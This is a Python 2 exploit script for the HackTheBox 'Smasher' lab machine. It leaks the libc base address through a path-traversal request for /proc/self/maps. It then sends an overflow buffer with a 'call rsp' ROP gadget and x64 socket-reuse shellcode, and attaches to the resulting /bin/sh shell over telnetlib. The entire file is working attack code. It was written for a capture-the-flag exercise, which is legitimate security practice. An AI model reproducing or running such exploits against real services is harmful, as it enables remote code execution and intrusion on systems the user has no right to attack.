import socket, sys, struct, urllib, telnetlib

HOST = "10.10.10.89"
SRVPORT = 1111

# Linux/x64 Socket Re-use (41 Bytes)
shellcode=("\x6a\x04\x5f\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce"
"\x79\xf6\x6a\x3b\x58\x48\x31\xf6\x56\x5a\x56\x48\xbf\x2f\x62\x69\x6e"
"\x2f\x2f\x73\x68\x57\x48\x89\xe7\x0f\x05")

def banner():
    print r"   _________                     .__                     "
    print r"  /   _____/ _____ _____    _____|  |__   ___________    "
    print r"  \_____  \ /     \\__  \  /  ___/  |  \_/ __ \_  __ \   "
    print r"  /        \  Y Y  \/ __ \_\___ \|   Y  \  ___/|  | \/   "
    print r" /_______  /__|_|  (____  /____  >___|  /\___  >__|      "
    print r"         \/      \/     \/     \/     \/     \/          "
    print "          HTB Smasher Remote Exploit By Cneeliz - 2018  \n"

def pack64(num):
    return struct.pack("<Q", num)

def connectsock(host, port):
    print "[*] Connecting to %s:%d" % (host, port)
    try:
        s = socket.create_connection((host, port))
    except:
        print "[!] Connection Failed... \n"
        exit()

    return s

def getreq(sock, host, port, get):
    req = ("GET //" + get + " HTTP/1.1\r\n"
    "Host: " + host + ":" + str(port) + "\r\n"
    "Range: bytes=1-2000\r\n"
    "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36\r\n"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n"
    "Accept-Language: en-US,en;q=0.9,nl;q=0.8,so;q=0.7\r\n"
    "Accept-Encoding: gzip,deflate\r\n"
    "Connection: close\r\n\r\n")

    print "[*] Sending GET request..."
    sock.send(req)
    data = sock.recv(8192)
    return data

def interact(sock):
    try:
        t = telnetlib.Telnet()
        t.sock = s
        print "[*] Shell Connected, let's type some commands: "
        t.interact()
    except:
        print "[!] Exploit Failed :( \n"

def closesock(sock):
    print "[*] Closing Connection."
    sock.close()
    print "[*] Done!"    


if __name__ == '__main__':
    banner()
    # Stage 1 Leak Libc base address
    print "[*] Stage1 -> leak Libc base address from /proc/self/maps:"
    s = connectsock(HOST, SRVPORT)

    data = getreq(s, HOST, SRVPORT, "proc/self/maps")
    memmap = data[552:984]
    print "[*] Libc memory map data:\n" + memmap + "\n"
    
    '''
    Needed Gadget to jump to our shellcode
    ROPgadget --binary libc-2.23.so | grep "call rsp"
    0x0000000000198051 : xor ch, bh ; call rsp
    '''

    libc_base = int(memmap[1:13], 16)
    print "[*] Libc base address is at %s" % (hex(libc_base))

    call_rsp_offset = 0x198051
    call_rsp_addr = libc_base + call_rsp_offset
    print "[*] xor ch, bh ; call rsp -> gadget is at %s" % (hex(call_rsp_addr))

    closesock(s)

    # Stage 2 Send exploit buffer.
    print "\n[*] Stage2 -> Sending exploit buffer:"

    # Constructing exploit buffer:
    buffer = "A" * 567
    buffer += urllib.quote_plus(pack64(call_rsp_addr)) # xor ch, bh ; call rsp
    buffer += shellcode
    
    s = connectsock(HOST, SRVPORT)
    getreq(s, HOST, SRVPORT, buffer)

    # Stage 3 Interact with our shell
    print "\n[*] Stage3 - > Trying to interact with our shell:"
    interact(s)

    closesock(s)
    sys.exit(0)
